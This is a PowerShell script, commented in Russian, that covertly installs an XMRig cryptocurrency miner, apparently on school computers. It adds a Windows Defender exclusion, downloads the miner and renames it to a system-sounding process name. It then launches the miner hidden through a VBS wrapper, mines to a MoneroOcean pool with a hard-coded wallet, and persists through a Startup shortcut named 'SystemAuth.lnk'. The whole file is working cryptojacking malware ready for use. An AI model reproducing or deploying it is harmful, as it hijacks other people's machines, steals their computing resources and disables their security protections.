$path = "C:\ProgramData\SystemLib"
$url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$wallet = "Ltc1ql404nad6rja6paas9h7dnd2uwmkju3re3s4tuf"
$procName = "WinDirectX"

# 1. Сначала жестко добавляем папку в исключения (ДО скачивания)
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force }
powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\SystemLib'" -ErrorAction SilentlyContinue

# 2. Скачивание (в тихом режиме)
$zip = "$path\data.zip"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $zip

# 3. Распаковка
Expand-Archive -Path $zip -DestinationPath $path -Force
Remove-Item $zip -Force

# 4. Переименование с проверкой
$original = "$path\xmrig.exe"
if (Test-Path $original) {
    Rename-Item $original "$procName.exe" -Force
}

# 5. Создание файлов запуска и автозагрузки (остается как было)
$cmd = "@echo off`n$path\$procName.exe -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --cpu-max-threads-hint 50 --priority 1"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemAuth.lnk")
$Shortcut.TargetPath = "$path\win_start.vbs"
$Shortcut.Save()

# 6. Функция check
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force }
$CheckFunc = "function check { if (Get-Process $procName -ErrorAction SilentlyContinue) { Write-Host 'СТАТУС: РАБОТАЕТ' -ForegroundColor Green } else { Write-Host 'СТАТУС: НЕ РАБОТАЕТ' -ForegroundColor Red } }`n"
$CheckFunc | Out-File -FilePath $ProfilePath -Append

Start-Process -FilePath "$path\win_start.vbs"
Write-Host "Готово! Теперь введите 'check'" -ForegroundColor Cyan
